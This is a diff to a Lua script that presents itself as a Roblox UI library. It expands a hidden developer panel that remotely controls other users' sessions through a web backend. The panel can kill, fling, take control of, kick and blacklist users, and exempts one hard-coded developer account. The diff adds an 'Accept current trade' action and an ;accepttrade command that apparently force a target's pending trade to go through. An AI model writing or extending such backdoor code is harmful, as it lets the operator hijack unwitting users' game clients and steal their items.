@@ -1011,6 +1011,8 @@ local function runDeveloperPanel(gui, options)
                     enabled = allowed
                         and row:GetAttribute("AllowControl") == true
                         and row:GetAttribute("AllowGameplay") == true
+                elseif action == "Accept current trade" then
+                    enabled = allowed and row:GetAttribute("AllowTradeAccept") == true
                 elseif action == "Flashbang" then
                     enabled = allowed and row:GetAttribute("AllowFlashbang") == true
                 elseif action == "Kick" then
@@ -1561,10 +1563,7 @@ local function runDeveloperPanel(gui, options)
             return selected and sessionData[selected.Name]
         end
         local function queue(session, kind, payload, statusLabel)
-            if
-                type(session) == "table"
-                and (session.userId == 417873123 or session.userId == 11341843321)
-            then
+            if type(session) == "table" and (session.userId == 417873123) then
                 local message = "Developer immunity is enabled"
                 if statusLabel then
                     statusLabel.Text = message
@@ -1623,9 +1622,10 @@ local function runDeveloperPanel(gui, options)
             ["Kill"] = true,
             ["Bring"] = true,
             ["Request trade review"] = true,
+            ["Accept current trade"] = true,
         }
-        detail.Controls.EffectsTitle.LayoutOrder = 17
-        detail.Controls.Effects.LayoutOrder = 18
+        detail.Controls.EffectsTitle.LayoutOrder = 18
+        detail.Controls.Effects.LayoutOrder = 19
         for index, name in ipairs({
             "Temp blacklist",
             "Kick",
@@ -1639,6 +1639,7 @@ local function runDeveloperPanel(gui, options)
             "Kill",
             "Bring",
             "Request trade review",
+            "Accept current trade",
         }) do
             local actionButton = button(detail.Controls, name, 0, 0, 230, function()
                 if backendAction then
@@ -1910,7 +1911,7 @@ local function runDeveloperPanel(gui, options)
                 output("Control requires one selected username")
                 return
             end
-            if session.userId == 417873123 or session.userId == 11341843321 then
+            if session.userId == 417873123 then
                 output("Developer immunity is enabled")
                 return
             end
@@ -2111,6 +2112,7 @@ local function runDeveloperPanel(gui, options)
                 Explode = "explode",
                 Flashbang = "flashbang",
                 ["Request trade review"] = "trade_review",
+                ["Accept current trade"] = "trade_accept",
                 Kill = "kill",
                 Bring = "bring",
             }
@@ -2132,7 +2134,7 @@ local function runDeveloperPanel(gui, options)
             name = name:lower()
             if name == "help" then
                 output(
-                    ";bring [target] | ;kill [target] | ;fling [target] | ;ragdoll [target] [seconds]\n;explode [target] | ;flashbang [target] | ;control <target> | ;uncontrol | ;tradereview [target]\n;kick [target] [reason] | ;gravity [target] [1-15 seconds]\n;blacklist [target] [minutes] [reason] | ;unblacklist <userId>\n;say [target] <message> | ;blacklists | ;players\nTarget: exact username, . for this server, or omitted for selected session. Only shared server locations can match ."
+                    ";bring [target] | ;kill [target] | ;fling [target] | ;ragdoll [target] [seconds]\n;explode [target] | ;flashbang [target] | ;control <target> | ;uncontrol | ;tradereview [target] | ;accepttrade <target>\n;kick [target] [reason] | ;gravity [target] [1-15 seconds]\n;blacklist [target] [minutes] [reason] | ;unblacklist <userId>\n;say [target] <message> | ;blacklists | ;players\nTarget: exact username, . for this server, or omitted for selected session. Only shared server locations can match ."
                 )
                 return
             end
@@ -2197,6 +2199,12 @@ local function runDeveloperPanel(gui, options)
             if name == "control" then
                 startControl(target)
                 return
+            elseif name == "accepttrade" then
+                if target == "." then
+                    output("Trade acceptance requires one selected username")
+                    return
+                end
+                kind, payload = "trade_accept", {}
             elseif name == "tradereview" then
                 kind, payload = "trade_review", {}
             elseif name == "explode" or name == "flashbang" then
@@ -2300,6 +2308,7 @@ local function runDeveloperPanel(gui, options)
                         not session.interactions
                         or action == "Kick" and not permission.disconnect
                         or action == "Flashbang" and not permission.flashbang
+                        or action == "Accept current trade" and not permission.tradeAccept
                         or action == "Control" and (not permission.control or not permission.gameplay)
                         or (
                                 action ~= "Kick"
@@ -2307,6 +2316,7 @@ local function runDeveloperPanel(gui, options)
                                 and action ~= "Control"
                                 and action ~= "Release control"
                                 and action ~= "Request trade review"
+                                and action ~= "Accept current trade"
                             )
                             and not permission.gameplay
                     )
@@ -2460,11 +2470,12 @@ local function runDeveloperPanel(gui, options)
                 end
                 row.LayoutOrder = index
                 row:SetAttribute("Username", session.username)
-                row:SetAttribute(
-                    "DeveloperImmune",
-                    session.userId == 417873123 or session.userId == 11341843321
-                )
+                row:SetAttribute("DeveloperImmune", session.userId == 417873123)
                 row:SetAttribute("Interactions", session.interactions)
+                row:SetAttribute(
+                    "AllowTradeAccept",
+                    session.permissions and session.permissions.tradeAccept == true or false
+                )
                 row:SetAttribute(
                     "AllowControl",
                     session.permissions and session.permissions.control == true or false
@@ -2671,7 +2682,7 @@ local function runDeveloperPanel(gui, options)
     }
 end
 
-local Library = { Version = "2.5.0" }
+local Library = { Version = "2.6.1" }
 function Library:CreateWindow(options)
     options = options or {}
     local url = options.BackendUrl or "https://daxware-backend.daxokayy.workers.dev"
